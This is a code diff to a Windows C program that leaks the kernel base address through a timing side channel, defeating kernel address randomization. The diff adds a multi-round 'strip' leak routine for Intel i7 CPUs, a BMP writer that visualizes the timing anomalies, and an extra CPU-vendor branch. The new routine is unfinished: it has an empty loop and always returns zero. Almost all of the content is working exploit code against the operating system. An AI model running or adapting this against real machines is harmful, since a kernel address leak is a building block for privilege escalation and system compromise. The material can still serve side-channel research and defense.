@@ -4,6 +4,8 @@
 #include <stdlib.h>
 #include <Windows.h>
 #include <winternl.h>
+#include <time.h>
+
 
 
 #define KERNEL_LOWER_BOUND 0xfffff80000000000ull
@@ -561,12 +563,179 @@ UINT64 leak_kernel_base_intel_reliable()
     return kernel_base;
 }
 
+
+DWORD write_bmp(HANDLE hFile, char* data, DWORD len) {
+    DWORD dwBytesWritten = 0;
+    WriteFile(
+        hFile,           // open file handle
+        data,      // start of data to write
+        len,  // number of bytes to write
+        &dwBytesWritten, // number of bytes that were written
+        NULL);            // no overlapped structure
+    return dwBytesWritten;
+}
+
+DWORD write_bmp_dword(HANDLE hFile, DWORD val) {
+    return write_bmp(hFile, &val, 4);
+}
+
+void save_bmp(char* bmp_name, UINT64* data, size_t len) {
+    HANDLE hFile = CreateFileA(bmp_name,                // name of the write
+        GENERIC_WRITE,          // open for writing
+        0,                      // do not share
+        NULL,                   // default security
+        CREATE_NEW,             // create new file only
+        FILE_ATTRIBUTE_NORMAL,  // normal file
+        NULL);                  // no attr. template
+
+    write_bmp(hFile, "\x42\x4D", 2); // magic
+    write_bmp_dword(hFile, 54 + len * 3); // full size
+    write_bmp_dword(hFile, 0); // app specific
+    write_bmp_dword(hFile, 54); // header size
+    write_bmp_dword(hFile, 40); // DIB size
+    write_bmp_dword(hFile, 256); // width
+    write_bmp_dword(hFile, len / 256); // height
+    write_bmp(hFile, "\x01\x00", 2); // color planes
+    write_bmp(hFile, "\x18\x00", 2); // bits per pixel
+    write_bmp_dword(hFile, 0); // compression
+    write_bmp_dword(hFile, len * 3); // body size
+    write_bmp_dword(hFile, 0); // misc
+    write_bmp_dword(hFile, 0); // misc
+    write_bmp_dword(hFile, 0); // misc
+    write_bmp_dword(hFile, 0); // misc
+
+    UINT64 common = most_frequent(data, len);
+    double min = common / 2;
+    double max = common * 2;
+    printf("Min: %f Max: %f  Common: %d \r\n", min, max, common);
+    char color[3];
+
+    for (UINT64 i = 0; i < len; i++)
+    {
+        memset(color, 0, 3);
+        if (data[i] < (common - 1)) {
+
+            double val;
+            if (data[i] < min)
+                val = 1.0;
+            else
+                val = (common * 1.0 - data[i]) / (common * 1.0 - min);
+            unsigned char cval = val * 255;
+            //printf("Negative anomaly: (%d) -%f %d\r\n", data[i], val, cval);
+            color[0] = cval;
+        }
+        if (data[i] > (common + 1)) {
+            double val;
+            if (data[i] > max)
+                val = 1.0;
+            else
+                val = (data[i] * 1.0 - common) / (max * 1.0 - common);
+
+            unsigned char cval = val * 255;
+            //printf("Positive anomaly: (%d) +%f %d\r\n", data[i], val, cval);
+            color[2] = cval;
+        }
+        write_bmp(hFile, color, 3);
+
+    }
+    CloseHandle(hFile);
+}
+
+#define STRIP_ROUNDS 5
+
+UINT64 leak_kernel_base_intel_strip()
+{
+    ULONG x = 0;
+
+    UINT64 data[ARR_SIZE] = { 0 };
+    INT64 ANOMALY_MAP[ARR_SIZE] = { 0 };
+    printf("STRIP VERSION RUNNING\r\n");
+
+    for (UINT64 round = 0; round < STRIP_ROUNDS; round++) {
+
+        // Do the measurements
+        for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
+        {
+            for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
+            {
+                UINT64 test = SCAN_START + idx * STEP;
+                bad_syscall();
+                UINT64 time = sidechannel((PVOID)test);
+                if (i >= DUMMY_ITERATIONS)
+                    data[idx] += time;
+            }
+        }
+
+
+        // Normalize results
+        for (UINT64 i = 0; i < ARR_SIZE; i++)
+        {
+            data[i] /= ITERATIONS;
+        }
+
+        UINT64 common = most_frequent(data, ARR_SIZE);
+        UINT64 anomaly_size = 0;
+        UINT64 anomaly = 0;
+        for (UINT64 i = 0; i < ARR_SIZE; i++) {
+            if (data[i] >= (common - 1) && data[i] <= (common + 1)) {
+                if (anomaly_size > 8) {
+                    //printf("Anomaly of length %d from %llx\r\n", anomaly_size, anomaly);
+                    for (UINT64 j = i - anomaly_size; j < i; j++) {
+                        ANOMALY_MAP[j] += data[j]-common;
+                    }
+                }
+
+                anomaly = 0;
+                anomaly_size = 0;
+                continue;
+            }
+            if (anomaly_size == 0) {
+                anomaly = (KERNEL_LOWER_BOUND + (i * STEP));
+            }
+            anomaly_size++;
+        }
+        
+        memset(data, 0, ARR_SIZE*sizeof(UINT64));
+    }
+    // Evaluate anomalies
+    /*UINT64 anomaly_size = 0;
+
+    for (UINT64 j = 0; j < ARR_SIZE; j++) {
+        if (ANOMALY_MAP[j] != STRIP_ROUNDS) {
+            if (anomaly_size > 0) {
+                printf("5 star anomaly strip from %llx, length %d\r\n", (KERNEL_LOWER_BOUND + ((j - anomaly_size) * STEP)), anomaly_size);
+            }
+            anomaly_size = 0;
+            continue;
+        }
+        anomaly_size++;
+    }*/
+
+    save_bmp("intel_strip.bmp", ANOMALY_MAP,ARR_SIZE);
+    UINT64 common = most_frequent(ANOMALY_MAP, ARR_SIZE);
+    double min = common / 2;
+    double max = common * 2;
+    for (UINT64 i = 0; i < ARR_SIZE; i++)
+    {
+    }
+    return 0;
+}
+
+
+
 VOID print_timings()
 {
     ULONG x = 0;
 
     UINT64 data[ARR_SIZE] = { 0 };
-    UINT64 min = ~0, addr = ~0;
+    UINT64 min = ~0, max = 0, addr = ~0;
+
+    time_t t;
+    char bmp_name[64];
+    
+    time(&t);
+    snprintf(bmp_name, 64, "pt_%lld.bmp", (long long)t);
+    printf("BMP name: %s\r\n", bmp_name);  
 
     for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
     {
@@ -580,23 +749,26 @@ VOID print_timings()
         }
     }
     UINT32 total_for_avg = 0;
-
+    
     for (UINT64 i = 0; i < ARR_SIZE; i++)
     {
         data[i] /= ITERATIONS;
+
         if (data[i] < min)
         {
             min = data[i];
             addr = SCAN_START + (i * STEP);
         }
-        total_for_avg += data[i];
-        printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
-    }
 
+        total_for_avg += data[i];
+        printf("%d) %llx %ld\n", i, (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
+    }
+    save_bmp(bmp_name, data, ARR_SIZE);
+   
     avg = total_for_avg / ARR_SIZE;
 
     printf("avg: %i\n", avg);
-
+    
     return 0;
 }
 
@@ -605,6 +777,7 @@ typedef enum _CPU_VENDOR {
     CpuUnknown,
     CpuIntel,
     CpuIntelN200,
+    CpuInteli7,
     CpuAmd,
     CpuAmdMobile
 } CPU_VENDOR;
@@ -628,6 +801,10 @@ CPU_VENDOR determine_cpu_vendor()
         if (strstr(brand_string, "N200"))
         {
             return CpuIntelN200;
+        }
+        if (strstr(brand_string, "i7"))
+        {
+            return CpuInteli7;
         }
         return CpuIntel;
     }
@@ -659,6 +836,10 @@ UINT64 leak_kernel_base_reliable()
     else if (vendor == CpuIntel)
     {
         kernel_base = leak_kernel_base_intel_reliable();
+    }
+    else if (vendor == CpuInteli7)
+    {
+        kernel_base = leak_kernel_base_intel_strip();
     }
     else if (vendor == CpuIntelN200)
     {
